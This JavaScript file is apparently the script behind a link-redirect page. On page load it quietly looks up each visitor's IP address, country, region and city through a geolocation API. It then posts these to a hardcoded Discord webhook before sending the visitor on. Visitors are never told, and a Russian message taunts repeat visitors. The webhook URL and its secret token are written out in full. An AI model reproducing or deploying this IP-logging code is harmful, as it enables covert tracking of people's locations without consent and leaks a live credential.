const LS_ITEM_NAME = 'statistic_visits_'+document.title;
const WEBHOOK_URL = 'https://discord.com/api/webhooks/791761446060556299/m4H_LyHiHwoutRdEKc_oWe8jZa11XYyXU-TdPWGcm4xzMZLW7BmPhBiWkMUqDktb-C0D';

localStorage.setItem(LS_ITEM_NAME, 1+(+localStorage.getItem(LS_ITEM_NAME)) || 1);
const visits = +localStorage.getItem(LS_ITEM_NAME);

async function getGeoData() {
	if(!localStorage.getItem('geo_data')) {
		const geo = await fetch('https://api.2ip.ua/geo.json', { 
			method: "GET" 
		}).then(res => res.json());

		localStorage.setItem('geo_data', JSON.stringify(geo));
	}
	return JSON.parse(localStorage.getItem('geo_data'));
}

function executeWebhook(url, data){
	if(!data.embeds) data.embeds = [];
	if(data.embed){
		data.embeds.push(data.embed);
		delete data.embed;
	}
	return fetch(url, {
		method: "POST",
		headers: {
			"Content-Type": "application/json",
		},
		body: JSON.stringify(data)
	})
}

async function statistic() {
	let geo = await getGeoData();
	let data = {
		content: `Link statistic`,
		avatar_url: 'https://www.google.com/s2/favicons?sz=256&domain_url=' + location.href,
		username: document.title
	}
	if(visits == 1) data.embed = {
 		title: geo.country,
    description: `**ip**: ${geo.ip}\n`+
    `**Область**: ${geo.region_rus}\n`+
    `**Город**: ${geo.city_rus}\n`,
    url: `https://api.2ip.ua/geo.json?ip=${geo.ip}`,
    color: 16382457,
	}
	else if(!(visits % 10)) data.content = `[UTC${geo.time_zone}] | ${geo.city_rus} | ${geo.ip} в ${visits} раз переходит по ссылке "${data.username}". Зачем?`;
	else return;
	return executeWebhook(WEBHOOK_URL, data);
}

async function redirect(url){
	await statistic();
	window.location.replace(url);
}